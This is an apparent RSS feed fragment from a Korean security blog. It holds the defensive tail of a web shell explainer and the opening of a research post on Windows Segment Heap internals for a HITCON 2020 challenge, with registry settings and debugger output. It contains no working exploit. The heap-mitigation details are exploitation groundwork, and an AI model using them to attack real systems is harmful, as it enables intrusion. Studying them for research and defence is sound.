&#xD0C8;&#xCDE8;, &#xBCC0;&#xC870;, &#xC545;&#xC131; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8; &#xC0BD;&#xC785; &#xB4F1; &#xB2E4;&#xC591;&#xD55C; &#xC545;&#xC131;&#xD589;&#xC704;&#xAC00; &#xBCF4;&#xC548; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC774;&#xB098; &#xC778;&#xC99D; &#xC2DC;&#xC2A4;&#xD15C; &#xB4F1;&#xC758; &#xBC29;&#xD574; &#xC5C6;&#xC774; &#xAC00;&#xB2A5;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC6F9; &#xC11C;&#xBC84;&#xC5D0; &#xC6F9; &#xC258;&#xC774; &#xC124;&#xCE58;&#xB418;&#xB294; &#xC21C;&#xAC04;&#xBD80;&#xD130; &#xC774;&#xBBF8; &#xD574;&#xCEE4;&#xC5D0;&#xAC8C; &#xC11C;&#xBC84;&#xB97C; &#xC7A5;&#xC545;&#xB2F9;&#xD588;&#xB2E4;&#xACE0; &#xBD10;&#xB3C4; &#xBB34;&#xBC29;&#xD569;&#xB2C8;&#xB2E4;.</p><h3 id="&#xC5B4;&#xB5BB;&#xAC8C;-&#xB9C9;&#xC744;-&#xC218;-&#xC788;&#xC744;&#xAE4C;&#xC694;"><a href="#&#xC5B4;&#xB5BB;&#xAC8C;-&#xB9C9;&#xC744;-&#xC218;-&#xC788;&#xC744;&#xAE4C;&#xC694;" class="headerlink" title="&#xC5B4;&#xB5BB;&#xAC8C; &#xB9C9;&#xC744; &#xC218; &#xC788;&#xC744;&#xAE4C;&#xC694;?"></a>&#xC5B4;&#xB5BB;&#xAC8C; &#xB9C9;&#xC744; &#xC218; &#xC788;&#xC744;&#xAE4C;&#xC694;?</h3><p>&#xC6F9; &#xC258;&#xC758; &#xADFC;&#xBCF8;&#xC801;&#xC778; &#xC6D0;&#xC778;&#xC740; &#xAC1C;&#xBC1C; &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD558;&#xB294; &#xC5C5;&#xB85C;&#xB4DC; &#xCDE8;&#xC57D;&#xC810;&#xC785;&#xB2C8;&#xB2E4;. &#xADF8;&#xB807;&#xAE30;&#xC5D0; &#xAC1C;&#xBC1C; &#xC2DC;&#xC5D0; &#xBD88;&#xD544;&#xC694;&#xD55C; &#xC5C5;&#xB85C;&#xB4DC; &#xAE30;&#xB2A5;&#xC744; &#xC81C;&#xAC70;&#xD558;&#xAC70;&#xB098; &#xD544;&#xC694;&#xD55C; &#xACBD;&#xC6B0;&#xC5D0;&#xB294; &#xC5C5;&#xB85C;&#xB4DC; &#xAC00;&#xB2A5;&#xD55C; &#xD655;&#xC7A5;&#xC790;&#xC5D0; &#xB300;&#xD55C; &#xD654;&#xC774;&#xD2B8; &#xB9AC;&#xC2A4;&#xD2B8;&#xB97C; &#xC791;&#xC131;&#xD558;&#xB294; &#xB4F1;&#xC758; &#xC2DC;&#xD050;&#xC5B4; &#xCF54;&#xB529;(Secure Coding)&#xC5D0; &#xD798;&#xC368;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;. &#xC6F9; &#xC11C;&#xBC84; &#xC5C5;&#xB85C;&#xB4DC; &#xAE30;&#xB2A5; &#xAD6C;&#xD604; &#xC2DC; &#xC5C5;&#xB85C;&#xB4DC; &#xD30C;&#xC77C; &#xC804;&#xC6A9; &#xD3F4;&#xB354;&#xB97C; &#xB9CC;&#xB4E4;&#xC5B4; &#xD574;&#xB2F9; &#xD3F4;&#xB354;&#xC5D0;&#xC11C;&#xC758; &#xD30C;&#xC77C; &#xC2E4;&#xD589;&#xC744; &#xC81C;&#xD55C;&#xD558;&#xB294; &#xAC83; &#xB610;&#xD55C; &#xC88B;&#xC740; &#xC608;&#xBC29;&#xCC45;&#xC774; &#xB420; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Hackypedia/">Hackypedia</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/poosic/">poosic</category>
      
      <category domain="https://hackyboiz.github.io/tags/web-shell/">web shell</category>
      
      <category domain="https://hackyboiz.github.io/tags/shell/">shell</category>
      
      
      <comments>https://hackyboiz.github.io/2021/09/24/poosic/Web-Shell/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Research] Hip하게 Heap 정복하기 Part 1 - Segment Heap(1)</title>
      <link>https://hackyboiz.github.io/2021/09/19/l0ch/segment-heap-part1/</link>
      <guid>https://hackyboiz.github.io/2021/09/19/l0ch/segment-heap-part1/</guid>
      <pubDate>Sun, 19 Sep 2021 09:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;&amp;#xC548;&amp;#xB155;&amp;#xD558;&amp;#xC138;&amp;#xC694;! &amp;#xB4DC;&amp;#xB77C;&amp;#xC774;&amp;#xBC84; &amp;#xC775;&amp;#xC2A4;&amp;#xD50C;&amp;#xB85C;&amp;#xC787; &amp;#xC774;&amp;#xD6C4;&amp;#xB8</description>
        
      
      
      
      <content:encoded><![CDATA[<p>&#xC548;&#xB155;&#xD558;&#xC138;&#xC694;! &#xB4DC;&#xB77C;&#xC774;&#xBC84; &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787; &#xC774;&#xD6C4;&#xB85C; &#xC624;&#xB79C;&#xB9CC;&#xC5D0; &#xC5F0;&#xAD6C;&#xAE00;&#xB85C; &#xB3CC;&#xC544;&#xC628; L0ch&#xC785;&#xB2C8;&#xB2E4;. </p><p>&#xC0AC;&#xC2E4; &#xC800;&#xBC88;&#xC8FC;&#xC5D0; &#xC62C;&#xB77C;&#xC640;&#xC57C; &#xD588;&#xC5C8;&#xB358; &#xAE00;&#xC774;&#xC9C0;&#xB9CC;.. &#xCF54;&#xB85C;&#xB098; &#xBC31;&#xC2E0;&#xC744; &#xB9DE;&#xACE0; &#xC774;&#xD2C0;&#xC774; &#xC0AD;&#xC81C;&#xB3FC;&#xC11C; &#xBBF8;&#xB8E8;&#xAC8C; &#xB410;&#xC2B5;&#xB2C8;&#xB2E4;&#x2026;</p><p><img src="/2021/09/19/l0ch/segment-heap-part1/Untitled.png" alt="Untitled"></p><blockquote><p>&#xD314;&#xC774;.. &#xD314;&#xC774; &#xC6C0;&#xC9C1;&#xC774;&#xC9C8; &#xC54A;&#xC544;..!</p></blockquote><p>&#xBAA8;&#xB450; &#xCF54;&#xB85C;&#xB098; &#xC870;&#xC2EC;&#xD558;&#xC138;&#xC694;&#x315C;&#x315C;</p><p>&#xC774;&#xBC88; &#xC2DC;&#xB9AC;&#xC988;&#xC5D0;&#xC11C;&#xB294; Windows&#xC758; Segment Heap&#xC5D0; &#xB300;&#xD574; &#xC54C;&#xC544;&#xBCF4;&#xACE0;, HITCON 2020&#xC5D0; &#xCD9C;&#xC81C;&#xB41C; Segment Heap Challenge &#xBB38;&#xC81C;&#xB97C; &#xD480;&#xC5B4;&#xBCF4;&#xB824;&#xACE0; &#xD569;&#xB2C8;&#xB2E4;! &#xC800;&#xBC88;&#xC5D0; NT Heap &#xACF5;&#xBD80;&#xD558;&#xBA74;&#xC11C; &#xBB38;&#xC81C;&#xD478;&#xB290;&#xB77C; &#xACE0;&#xC0DD;&#xD588;&#xB358;&#xAC70; &#xBC8C;&#xC368; &#xAE4C;&#xBA39;&#xACE0; &#xB610;&#xB610; &#xACE0;&#xC0DD;&#xC744; &#xC0AC;&#xC11C;&#xD558;&#xB124;&#xC694;.. &#xC774;&#xBC88;&#xC5D0;&#xB3C4; &#xC5B4;&#xB5BB;&#xAC8C;&#xB4E0; &#xB418;&#xACA0;&#xC8E0;!</p><h1 id="&#xAC1C;&#xC694;-Segment-Heap"><a href="#&#xAC1C;&#xC694;-Segment-Heap" class="headerlink" title="&#xAC1C;&#xC694; - Segment Heap"></a>&#xAC1C;&#xC694; - Segment Heap</h1><p>Segment Heap&#xC740; Windows 10&#xBD80;&#xD130; &#xB3C4;&#xC785;&#xB41C; &#xC0C8;&#xB85C;&#xC6B4; memory allocator&#xC785;&#xB2C8;&#xB2E4;. Windows&#xC758; NT Kernel&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9;&#xB41C; &#xAE30;&#xC874; memory allocator&#xC778; NT Heap&#xC5D0; &#xB300;&#xD574;&#xC11C;&#xB294; &#xC774;&#xC804; &#xC2DC;&#xB9AC;&#xC988; <a href="https://hackyboiz.github.io/2021/01/31/l0ch/pwncoolsexy-part1/">Pwn&#xD558;&#xACE0; Cool&#xD558;&#xACE0; Sexy&#xD55C; Windows &#xD0D0;&#xBC29;&#xAE30;</a> &#xD30C;&#xD2B8; 2&#xBD80;&#xD130; &#xC124;&#xBA85;&#xB418;&#xC5B4; &#xC788;&#xC73C;&#xBA70; Segment Heap&#xC5D0; &#xB300;&#xD55C; &#xC5B8;&#xAE09;&#xB3C4; &#xC0B4;&#xC9DD; &#xB098;&#xC624;&#xB2C8; NT Heap&#xACFC;&#xC758; &#xCC28;&#xC774;&#xC810;&#xC774; &#xAD81;&#xAE08;&#xD558;&#xC2DC;&#xB2E4;&#xBA74; &#xAC19;&#xC774; &#xBCF4;&#xBA74; &#xB3C4;&#xC6C0;&#xC774; &#xB429;&#xB2C8;&#xB2E4;!</p><p>Segment Heap&#xC758; &#xC544;&#xD0A4;&#xD14D;&#xCC98;&#xB294; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/09/19/l0ch/segment-heap-part1/Untitled%201.png" alt="Untitled"></p><ul><li>128KB &#xBCF4;&#xB2E4; &#xC791;&#xAC70;&#xB098; &#xAC19;&#xC740; &#xD06C;&#xAE30;&#xC774;&#xBA70; LFH&#xC5D0; &#xC758;&#xD574; &#xCC98;&#xB9AC;&#xB418;&#xC9C0; &#xC54A;&#xB294; &#xACBD;&#xC6B0; &#xAC00;&#xBCC0; &#xD06C;&#xAE30;(variable size, VS) &#xD560;&#xB2F9;&#xC790;&#xAC00; &#xC0AC;&#xC6A9;&#xB429;&#xB2C8;&#xB2E4;.</li><li>128KB&#xBCF4;&#xB2E4; &#xD06C;&#xACE0; 508KB&#xBCF4;&#xB2E4; &#xC791;&#xC740; &#xD560;&#xB2F9; &#xC694;&#xCCAD;&#xC740; &#xBC31;&#xC5D4;&#xB4DC;&#xC5D0;&#xC11C; &#xC9C1;&#xCCA9; &#xCC98;&#xB9AC;&#xB429;&#xB2C8;&#xB2E4;.</li><li>508KB&#xBCF4;&#xB2E4; &#xD070; Large Block &#xD560;&#xB2F9; &#xC694;&#xCCAD;&#xC740; &#xAE30;&#xBCF8;&#xC801;&#xC778; 64KB &#xD560;&#xB2F9; &#xB2E8;&#xC704;&#xB97C; &#xC0AC;&#xC6A9;&#xD574; VirtualAlloc&#xC744; &#xC9C1;&#xC811; &#xD638;&#xCD9C;&#xD574; &#xCC98;&#xB9AC;&#xB429;&#xB2C8;&#xB2E4;.</li><li>16,368 bytes&#xBCF4;&#xB2E4; &#xC791;&#xAC70;&#xB098; &#xAC19;&#xC740; &#xACBD;&#xC6B0; LFH allocator&#xAC00; &#xC0AC;&#xC6A9;&#xB429;&#xB2C8;&#xB2E4;.<ul><li>VS&#xC640; LFH &#xBAA8;&#xB450; Heap SubSegment&#xB97C; &#xC0DD;&#xC131;&#xD558;&#xAE30; &#xC704;&#xD574; &#xBC31;&#xC5D4;&#xB4DC;&#xB97C; &#xC0AC;&#xC6A9;</li></ul></li></ul><p>NT Heap&#xACFC;&#xC758; &#xCC28;&#xC774;&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ul><li>Segment Heap&#xC740; &#xBA54;&#xD0C0;&#xB370;&#xC774;&#xD130;&#xAC00; &#xB354; &#xC791;&#xC740; &#xBA54;&#xBAA8;&#xB9AC;&#xB97C; &#xC0AC;&#xC6A9;&#xD574; &#xBAA8;&#xBC14;&#xC77C; &#xC7A5;&#xCE58;&#xC5D0; &#xC801;&#xD569;&#xD569;&#xB2C8;&#xB2E4;.</li><li>&#xB450; Heap &#xBAA8;&#xB450; LFH &#xD560;&#xB2F9;&#xC744; &#xC9C0;&#xC6D0;&#xD558;&#xC9C0;&#xB9CC; &#xB0B4;&#xBD80; &#xAD6C;&#xD604;&#xC740; &#xC644;&#xC804;&#xD788; &#xB2E4;&#xB974;&#xBA70; Segment Heap&#xC774; &#xBA54;&#xBAA8;&#xB9AC; &#xC0AC;&#xC6A9;&#xB7C9;&#xACFC; &#xC131;&#xB2A5;&#xBA74;&#xC5D0;&#xC11C; &#xB354; &#xD6A8;&#xC728;&#xC801;&#xC785;&#xB2C8;&#xB2E4;.</li><li>Segment Heap&#xC740; &#xC720;&#xC800; &#xC81C;&#xACF5; &#xBA54;&#xBAA8;&#xB9AC; &#xB9F5; &#xD30C;&#xC77C;&#xACFC;&#xB294; &#xD568;&#xAED8; &#xC0AC;&#xC6A9;&#xD560; &#xC218; &#xC5C6;&#xACE0;, &#xB300;&#xC2E0; NT Heap&#xC774; &#xC0DD;&#xC131;&#xB429;&#xB2C8;&#xB2E4;.</li><li>Segment Heap&#xC758; &#xBA54;&#xD0C0;&#xB370;&#xC774;&#xD130;&#xB294; &#xC2E4;&#xC81C; &#xB370;&#xC774;&#xD130;&#xC640; &#xAD6C;&#xBD84;&#xB418;&#xC5B4; &#xD2B9;&#xC815; &#xBE14;&#xB85D;&#xC5D0; &#xB300;&#xD55C; &#xBA54;&#xD0C0;&#xB370;&#xC774;&#xD130;&#xB97C; &#xCC3E;&#xAE30; &#xC5B4;&#xB835;&#xAC8C; &#xB9CC;&#xB4E4;&#xC5B4; &#xBE44;&#xAD50;&#xC801; &#xC548;&#xC804;&#xD569;&#xB2C8;&#xB2E4;.</li></ul><p>Segment Heap&#xC740; &#xB610;&#xD55C; &#xBA54;&#xBAA8;&#xB9AC; &#xCEE4;&#xB7FD;&#xC158; &#xCDE8;&#xC57D;&#xC810;&#xC5D0; &#xC758;&#xD55C; &#xCF54;&#xB4DC; &#xC2E4;&#xD589;&#xC5D0; &#xB300;&#xBE44;&#xD574; &#xC5EC;&#xB7EC; &#xBCF4;&#xC548; &#xB9E4;&#xCEE4;&#xB2C8;&#xC998;&#xC744; &#xCD94;&#xAC00;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ul><li>Segment Heap&#xC740; &#xC138;&#xADF8;&#xBA3C;&#xD2B8;&#xC640; &#xC11C;&#xBE0C;&#xC138;&#xADF8;&#xBA3C;&#xD2B8;&#xB97C; &#xCD94;&#xC801;&#xD558;&#xAE30; &#xC704;&#xD574; Linked List&#xB97C;, &#xB808;&#xB4DC;&#xBE14;&#xB799;(RB) &#xD2B8;&#xB9AC;&#xB85C; &#xBC31;&#xC5D4;&#xB4DC;&#xC640; VS &#xD560;&#xB2F9;&#xC744; &#xCD94;&#xC801;&#xD569;&#xB2C8;&#xB2E4;. NT Heap&#xACFC; &#xC720;&#xC0AC;&#xD55C; &#xBC29;&#xC2DD;&#xC73C;&#xB85C; &#xB178;&#xB4DC; &#xC0BD;&#xC785; &#xBC0F; &#xC0AD;&#xC81C; &#xC791;&#xC5C5; &#xC804;&#xC5D0; &#xAC80;&#xC0AC;&#xB97C; &#xD558;&#xC9C0;&#xB9CC;, &#xC190;&#xC0C1;&#xB41C; &#xB178;&#xB4DC;&#xAC00; &#xAC10;&#xC9C0;&#xB418;&#xBA74;<code>RTLFailFast</code> &#xB97C; &#xD638;&#xCD9C;&#xD558;&#xB294; &#xBE60;&#xB978; &#xC2E4;&#xD328; &#xBA54;&#xCEE4;&#xB2C8;&#xC998;&#xC744; &#xC0AC;&#xC6A9;&#xD574; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB97C; &#xC989;&#xC2DC; &#xC885;&#xB8CC;&#xD569;&#xB2C8;&#xB2E4;.</li><li>Segment Heap&#xC758; &#xC77C;&#xBD80;&#xB294; &#xCF5C;&#xBC31;&#xC744; &#xD5C8;&#xC6A9;&#xD558;&#xB098; &#xD568;&#xC218;&#xD3EC;&#xC778;&#xD130;&#xB97C; &#xB0B4;&#xBD80; &#xB09C;&#xC218;&#xD654;&#xB41C; &#xD799;&#xC758; &#xD0A4;&#xC640; &#xCEE8;&#xD14D;&#xC2A4;&#xD2B8; &#xC8FC;&#xC18C;&#xB85C; XOR &#xC778;&#xCF54;&#xB529;&#xD574; &#xCF5C;&#xBC31;&#xC744; overwrite&#xD558;&#xAE30; &#xC5B4;&#xB835;&#xB3C4;&#xB85D; &#xD569;&#xB2C8;&#xB2E4;.</li><li>LFH&#xC640; VS &#xC11C;&#xBE0C;&#xC138;&#xADF8;&#xBA3C;&#xD2B8;, Large Block&#xC774; &#xD560;&#xB2F9;&#xB418;&#xBA74; &#xAC00;&#xB4DC; &#xD398;&#xC774;&#xC9C0;&#xAC00; &#xCD94;&#xAC00;&#xB429;&#xB2C8;&#xB2E4;. &#xAC00;&#xB4DC; &#xD398;&#xC774;&#xC9C0;&#xB294; &#xC778;&#xC811;&#xD55C; &#xB370;&#xC774;&#xD130; &#xC190;&#xC0C1;&#xC744; &#xD0D0;&#xC9C0;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</li></ul><p>&#xC774;&#xB807;&#xAC8C; &#xBCF4;&#xBA74; Segment Heap&#xC774; NT Heap&#xBCF4;&#xB2E4; &#xB354;&#xC6B1; &#xBC1C;&#xC804;&#xB41C; Heap&#xC774;&#xB77C;&#xACE0; &#xBCFC; &#xC218; &#xC788;&#xC744; &#xAC83; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p><img src="/2021/09/19/l0ch/segment-heap-part1/Untitled%202.png" alt="Untitled"></p><p>&#xD558;&#xC9C0;&#xB9CC; &#xC5EC;&#xC804;&#xD788; &#xB808;&#xAC70;&#xC2DC;&#xAC00; &#xBB38;&#xC81C;&#xC8E0;&#x2026; &#x314B;&#x314B;&#x314B; &#xC0AC;&#xC9C4;&#xCC98;&#xB7FC; &#xAE30;&#xC874; NT Heap&#xC5D0; &#xCD5C;&#xC801;&#xD654;&#xB41C; &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xC5D0; &#xC601;&#xD5A5;&#xC744; &#xC904; &#xC218; &#xC788;&#xC5B4; &#xB3C4;&#xC785;&#xB41C;&#xC9C0; &#xAF64; &#xB418;&#xC5C8;&#xC9C0;&#xB9CC; Windows&#xC758; &#xAE30;&#xBCF8; &#xD799; &#xD560;&#xB2F9;&#xC790;&#xB294; &#xC5EC;&#xC804;&#xD788; NT Heap&#xC785;&#xB2C8;&#xB2E4;. &#xD558;&#xC9C0;&#xB9CC; &#xC2DC;&#xAC04;&#xC774; &#xC9C0;&#xB098;&#xBA74;&#xC11C; &#xC810;&#xC810; Segment Heap&#xC744; &#xB9CE;&#xC774; &#xC0AC;&#xC6A9;&#xD558;&#xAC8C; &#xB420;&#xAC70;&#xACE0;, &#xAE30;&#xBCF8; &#xD799; &#xD560;&#xB2F9;&#xC790;&#xAC00; &#xB420; &#xB0A0;&#xB3C4; &#xC624;&#xACA0;&#xC8E0;?  </p><p>&#xD604;&#xC7AC; UWP(Universal Windows Platform) &#xC571;&#xC740; &#xAE30;&#xBCF8;&#xC801;&#xC73C;&#xB85C; Segment Heap&#xC744; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;. UWP&#xBFD0;&#xB9CC; &#xC544;&#xB2C8;&#xB77C; <code>csrss.exe</code>, <code>lsass.exe</code>, <code>runtimebroker.exe</code>, <code>services.exe</code>, <code>smss.exe</code>, <code>svchost.exe</code> &#xB4F1;&#xACFC; &#xAC19;&#xC740; &#xD2B9;&#xC815; &#xC2DC;&#xC2A4;&#xD15C; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC5D0;&#xC11C;&#xB3C4; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xD2B9;&#xC815; &#xC2E4;&#xD589;&#xD30C;&#xC77C;&#xC5D0; &#xB300;&#xD574; Segment Heap&#xC744; &#xD65C;&#xC131;&#xD654;/&#xBE44;&#xD65C;&#xC131;&#xD654; &#xD558;&#xAE30; &#xC704;&#xD574;&#xC11C;&#xB294; &#xC544;&#xB798; &#xB808;&#xC9C0;&#xC2A4;&#xD2B8;&#xB9AC; &#xC124;&#xC815;&#xC744; &#xD558;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\(executable)FrontEndHeapDebugOptions = (DWORD)Bit <span class="hljs-number">2</span> (<span class="hljs-number">0x04</span>): Disable Segment HeapBit <span class="hljs-number">3</span> (<span class="hljs-number">0x08</span>): Enable Segment Heap</code></pre><p>&#xBAA8;&#xB4E0; &#xC2E4;&#xD589; &#xD30C;&#xC77C;&#xC5D0; &#xB300;&#xD574; &#xC804;&#xC5ED;&#xC801;&#xC73C;&#xB85C; Segment Heap&#xC744; &#xD65C;&#xC131;&#xD654;&#xD558;&#xB824;&#xBA74; &#xC544;&#xB798; &#xB808;&#xC9C0;&#xC2A4;&#xD130; &#xC124;&#xC815;&#xC744; &#xD558;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Segment HeapEnabled = (DWORD)<span class="hljs-number">0</span> : Disable Segment Heap(Not <span class="hljs-number">0</span>): Enable Segment Heap</code></pre><p>&#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC5D0;&#xC11C; Segment Heap&#xC774; &#xD65C;&#xC131;&#xD654;&#xB41C; &#xACBD;&#xC6B0;&#xC5D0;&#xB3C4; NT Heap&#xC5D0;&#xC11C; &#xAD00;&#xB9AC;&#xD574;&#xC57C; &#xD558;&#xB294; &#xD799;&#xC774; &#xC788;&#xC5B4; &#xBAA8;&#xB4E0; &#xD799;&#xC744; Segment Heap&#xC73C;&#xB85C; &#xAD00;&#xB9AC;&#xD558;&#xB294; &#xAC83;&#xC740; &#xC544;&#xB2D9;&#xB2C8;&#xB2E4;. Windows 10&#xC5D0;&#xC11C; UWP &#xC571;&#xC73C;&#xB85C; &#xBC14;&#xB010; &#xACC4;&#xC0B0;&#xAE30;&#xB97C; &#xB514;&#xBC84;&#xAE45;&#xD558;&#xBA70; Segment Heap&#xC5D0; &#xB300;&#xD574; &#xC0B4;&#xD3B4;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/09/19/l0ch/segment-heap-part1/Untitled%203.png" alt="Untitled"></p><blockquote><p>&#xCEF4;&#xD4E8;&#xD130; &#xD558;&#xB294; &#xC0AC;&#xB78C; &#xD2B9;) &#xACC4;&#xC0B0;&#xAE30; &#xD0A4;&#xBA74; &#xAE30;&#xBCF8;&#xAC12; &#xD504;&#xB85C;&#xADF8;&#xB798;&#xBA38;&#xC784;</p></blockquote><h2 id="Heap-Creation"><a href="#Heap-Creation" class="headerlink" title="Heap Creation"></a>Heap Creation</h2><p>Segment Heap&#xC774; &#xD65C;&#xC131;&#xD654;&#xB41C; &#xACBD;&#xC6B0; <code>HeapCreate()</code>&#xC5D0; &#xC758;&#xD574; &#xC0DD;&#xC131;&#xB41C; &#xD799;&#xC740; &#xD799;&#xC744; &#xD655;&#xC7A5;&#xD560; &#xC218; &#xC5C6;&#xC74C;&#xC744; &#xC758;&#xBBF8;&#xD558;&#xB294; <code>dwMaximumSize</code>&#xAC00; 0&#xC774; &#xC544;&#xB2C8;&#xBA74; Segment Heap&#xC5D0; &#xC758;&#xD574; &#xAD00;&#xB9AC;&#xB429;&#xB2C8;&#xB2E4;.</p><p><code>RtlCreateHeap()</code> API&#xAC00; &#xD799;&#xC744; &#xC0DD;&#xC131;&#xD558;&#xB294; &#xB370; &#xC9C1;&#xC811; &#xC0AC;&#xC6A9;&#xB418;&#xB294; &#xACBD;&#xC6B0; Segment Heap&#xC774; &#xC0DD;&#xC131;&#xB41C; &#xD799;&#xC744; &#xAD00;&#xB9AC;&#xD558;&#xB824;&#xBA74; &#xB2E4;&#xC74C; &#xC870;&#xAC74;&#xC744; &#xB9CC;&#xC871;&#xD574;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;.</p><ul><li><code>RtlCreateHeap()</code>&#xC5D0; &#xC804;&#xB2EC;&#xB418;&#xB294; <code>HEAP_GROWABLE</code>&#xC774; &#xC124;&#xC815;&#xB418;&#xC5B4; &#xC788;&#xC5B4;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;(&#xD655;&#xC7A5; &#xAC00;&#xB2A5;&#xD55C; &#xD799;)</li><li><code>RtlCreateHeap()</code>&#xC5D0; &#xC804;&#xB2EC;&#xB41C; <code>HeapBase</code> &#xC778;&#xC218;&#xB294; NULL&#xB85C;, &#xD799; &#xBA54;&#xBAA8;&#xB9AC;&#xAC00; &#xBBF8;&#xB9AC; &#xD560;&#xB2F9;&#xB418;&#xC9C0; &#xC54A;&#xC740; &#xC0C1;&#xD0DC;&#xC5EC;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;.</li><li>&#xB9E4;&#xAC1C;&#xBCC0;&#xC218; &#xC778;&#xC218;&#xAC00; <code>RtlCreateHeap()</code>&#xC5D0; &#xC804;&#xB2EC;&#xB418;&#xBA74; <code>SegmentReserve</code>, <code>SegmentCommit</code>, <code>VirtualMemoryThreshold</code> &#xBC0F; <code>CommitRoutine</code>&#xACFC; &#xAC19;&#xC740; &#xB9E4;&#xAC1C;&#xBCC0;&#xC218; &#xD544;&#xB4DC;&#xB97C; 0 &#xB610;&#xB294; NULL&#xB85C; &#xC124;&#xC815;&#xD574;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;.</li><li><code>RtlCreateHeap()</code>&#xC5D0; &#xC804;&#xB2EC;&#xB41C; Lock &#xC778;&#xC218;&#xB294; NULL&#xC774;&#xC5B4;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;.</li></ul><p>&#xACC4;&#xC0B0;&#xAE30; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC5D0; &#xB514;&#xBC84;&#xAC70;&#xB97C; attach&#xD558;&#xACE0; <code>!heap</code> &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xBA74; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC740; &#xACB0;&#xACFC;&#xAC00; &#xB098;&#xC635;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-number">0</span>:<span class="hljs-number">022</span>&gt; !heap        Heap Address      NT/Segment Heap         <span class="hljs-number">23486</span>a90000         Segment Heap         <span class="hljs-number">23486</span>a20000              NT Heap         <span class="hljs-number">23486b</span>e0000         Segment Heap         <span class="hljs-number">234891</span>d0000         Segment Heap         <span class="hljs-number">234899</span>d0000         Segment Heap         <span class="hljs-number">23489e10000</span>              NT Heap         <span class="hljs-number">23489e30000</span>              NT Heap         <span class="hljs-number">23489f</span>e0000              NT Heap         <span class="hljs-number">23489800000</span>              NT Heap</code></pre><p>&#xCCAB; &#xBC88;&#xC9F8; Heap&#xC740; &#xD504;&#xB85C;&#xC138;&#xC2A4; &#xAE30;&#xBCF8; &#xD799;&#xC73C;&#xB85C;, Segment Heap&#xC73C;&#xB85C; &#xC0DD;&#xC131;&#xB41C; &#xAC83;&#xC744; &#xBCFC; &#xC218;&#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB450; &#xBC88;&#xC9F8; &#xD799;&#xC740; &#xC720;&#xC800; &#xC815;&#xC758; &#xBA54;&#xBAA8;&#xB9AC; &#xBE14;&#xB85D;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xBA70; &#xC774; &#xAE30;&#xB2A5;&#xC740; Segment Heap&#xC5D0;&#xC11C;&#xB294; &#xC9C0;&#xC6D0;&#xB418;&#xC9C0; &#xC54A;&#xC544; NT Heap&#xC73C;&#xB85C; &#xC0DD;&#xC131;&#xB41C; &#xAC83;&#xC744; &#xBCFC; &#xC218; &#xC788;&#xC8E0;. UWP &#xC571;&#xC5D0;&#xC11C;&#xB3C4; NT Heap&#xC5D0;&#xC11C; &#xAD00;&#xB9AC;&#xD558;&#xB294; &#xD799;&#xC774; &#xC874;&#xC7AC;&#xD55C;&#xB2E4;&#xB294; &#xAC83;&#xC744; &#xC54C; &#xC218; &#xC788;&#xB124;&#xC694;. &#xCCAB; &#xBC88;&#xC9F8; &#xAE30;&#xBCF8; &#xD799; &#xC815;&#xBCF4;&#xB97C; &#xB354; &#xBCF4;&#xB3C4;&#xB85D; &#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h2 id="SEGMENT-HEAP"><a href="#SEGMENT-HEAP" class="headerlink" title="_SEGMENT_HEAP"></a>_SEGMENT_HEAP</h2><p>Segment Heap&#xC774; &#xD65C;&#xC131;&#xD654;&#xB418;&#xBA74; <code>HeapCreate()</code> &#xB610;&#xB294; <code>RtlCreateHeap()</code>&#xC5D0; &#xC758;&#xD574; &#xBC18;&#xD658;&#xB41C; Heap &#xC8FC;&#xC18C;&#xC640; &#xD578;&#xB4E4;&#xC740; NT Heap&#xC758; <code>_HEAP</code> &#xAD6C;&#xC870;&#xCCB4; &#xB300;&#xC2E0; &#xC544;&#xB798;&#xCC98;&#xB7FC; <code>_SEGMENT_HEAP</code> &#xAD6C;&#xC870;&#xCCB4;&#xB97C; &#xAC00;&#xB9AC;&#xD0B5;&#xB2C8;&#xB2E4;. </p><pre><code class="hljs 